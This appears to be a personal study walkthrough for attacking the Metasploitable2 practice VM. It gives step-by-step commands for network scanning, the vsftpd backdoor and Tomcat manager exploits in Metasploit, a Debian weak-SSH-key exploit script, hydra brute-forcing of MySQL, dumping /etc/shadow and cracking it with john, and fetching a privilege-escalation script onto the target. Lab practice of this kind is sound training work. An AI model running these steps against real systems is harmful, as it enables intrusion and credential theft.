---------------Setting up metasploitable2--------------------
//Configure basic requirement of ram,core,network according to our OS in virtual box
//start the machine
//login credentials
metasploitable login : msfadmin
password : msfadmin 

#in kali
//first do ifconfig to know the netmask of our ip and run the discover tool
here in our case we have inet 192.168.190.144 so we have netmask 192.168.190. and now we will scan from 0 to 255 range

netdiscover -r 192.168.190.0/24                 //we will scan with r range to know all the devices in the network .

//Now we know the ip pf the target machine now we will scan port
nmap -v -T5 -p- -A IP_of_TARGET-oA metasploitable2
//-v for verbose
//-p- is same as -p 0-65535
//-A most detailed output check man to get details
//-oA save output in all formats that is nmap gnamp xml and after that name of the file we want here I have named it metasploitable2
//-T5 here we can write numbers from 1 to 5 , 1 means slow and 5 means fast scan

//GUI version of nmap is zenmap
//easy to use

--------------Exposing ftp-----------------------------
//details from nmap
port 21 
version vsftpd 2.3.4

//try to connect to target
ftp IP_of_TARGET
//if ftp not installed
apt install ftp

//here anonymous login is allowed so just type in name
Name : anonymous
password : anything

to get information of ftp commands type
ftp> ?
ftp> bye        //to close the connection

//Now we will search exploit of vsftps version in browser
we have result of rapid7 creator of metaslpoit 
from there we have the name of the module

start metasploit in kali and paste the module name
msf> use exploit/unix/ftp/vsftpd_234_backdoor
//type info to see the details of the exploit
msf>info
//type option to see option to be set for the exploit
msf>show options
//we have to set rhosts
msf>set rhost IP_of_TARGET

//we can check the exploit before running it completely
msf>check
//now running the exploit
msf>exploit or run 
//and we will have the shell tada

--------------Vulnerability scanning Nessus--------------------
//Do the installing stuff
//now we will start nessus

kali>/etc/init.d/nessusd start
//to identify the port in which nessus is hosting its website
kali>netstat -antp
//once we have the port open the browser and type 127.0.0.1:port_number
//login with credential

//go to new scan
//go to basic network scan
//name the scan
//type description
//Enter folder path
//add the ip of target
//save it and launch the scan

-----------------SSh vuln------------------------------------------
from nessus scan we got a openssh vuln of random number generation from there we got exploit CVE just google it and got github link where we got python exploit now we have to download it 
use wget to download
kali>wget download_link_of_exploit

//running the script it looks like python2 script
kali> python2 5720.py     //5720.py is the name of script we just downloaded
now it shows we have to enter the arguments to run it successful
we need to download the file from git repo in debian-ssh/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 link in download button
kali>wget paste_the_link

//now decompressing bz2 file
kali> bzip2 -d debian_ssh_rsa_2048_x86.tar.bz2

//un archiving tar file
kali> tar -xvf debian_ssh_rsa_2048_x86.tar.bz2

//both above commands can be done in one go also
kali> tar -xjvf debian_ssh_rsa_2048_x86.tar.bz2

//runnin exploit with arguments which is provided when we run it without argument
kali> python 5720.py rsa/2048/ IP_of_TARGET root 10

//now we have to exceute the command provided by the script
kali> ssh -lroot -p22 -i rsa/2048/rsa_which_is_valid IP_of_TARGET

-------------------------Web service vuln--------------------------
tool - nikto (for web vuln)

nikto -host IP_of_TARGET -p 8081        //-host for specifying host and -p for specifiny port of web server if port not specified then it will use defualt port 80

//here we found a vuln of tomcat/manager with credentials user : tomcat password : tomcat so se will find vuln of that in metasploit
//starting metasploit
search tomcat
//we find two reliable exploit tomcat_mgr_deploy and tomcat_mgr_upload
//for now we will use upload exploit

msf> use exploit/multi/http/tomcat_mgr_deploy
show options
set HttpPassword tomcat
set HttpUsername tomcat
set rhost IP_of_target
set rport 8081

//run the exploit 
exploit
//now we get meterpreter shell

//to see what command we can run on meterpreter shell
meterprter > ?

------------------------Database and password attacks----------------

//from nmap we found that 
3306/tcp mysql open (MySQL 5.0.51a-3ubuntu5)<--service

//we have to guess the username and password for mysql using sqldict tool (password dictonary attack)

//to run sql dict we need to install wine32 (which allows us to use windows program in linux)

//when we run sqldict we will be provided command to install wine32
kali>sqldict

//now after installation run sqldict again and if got a GUI interface enter TargetIP, Targer account (username) , and list of password.

//we can do the above through another tool hydra
hydra -l root -P password-list mysql://IP_of_target      //-l to specify username
and we find the password - [blank]

//now once we found the password from hydra we will login
mysql -u root -p -h IP_of_target        //-p for password -u for username
-h for host

//we will get mysql database

//to view database in server
show databases;

//by doing that we found an interesting database dvwa so we will look into it
use dvwa;

//to view tables in database
show tables;

//we found two tables there guestbook and users
//lets view data in tabel users

select * from users;        // * here mean everything in users table
//we have some emails and their hashes of password we can crack it online or we can use john the ripper

--------------Password Cracking-----------------------------

//once we have shell in target system we will crack their password
cat /etc/passwd
//copy all the data and save it in kali machine filename:password

cat /etc/shadow
//copy all the data and save it in filename:shadow

//we will use john the ripper to decrpyt the password
//first we need to combine shadow fiie and password file as it is format of john the ripper

unshadow password shadow > crack-me

//now cracking
john crack-me

//using dictonary-file
john --wordlist=/usr/share/wordlists/rockyou.txt crack-me

//to view cracked password
john --show crack-me

------------Privilege Escalation-------------------------------------
kali>unix-privesec-check
//running this will give url to download the script
//now copy the link of the download 

//Now in target shell we wil download that script
//it meterpreter than 
meterpreter>shell       //to get shell of the system
//navigate to /tmp
//downloading the script
wget Link_which_we_copied_from_url_download_button
//extracting tar.gz file
tar -zxvf downloaded_file.tar.gz
//running the script
./unix-privesc-check standard       //we can also to detailed in place of standard
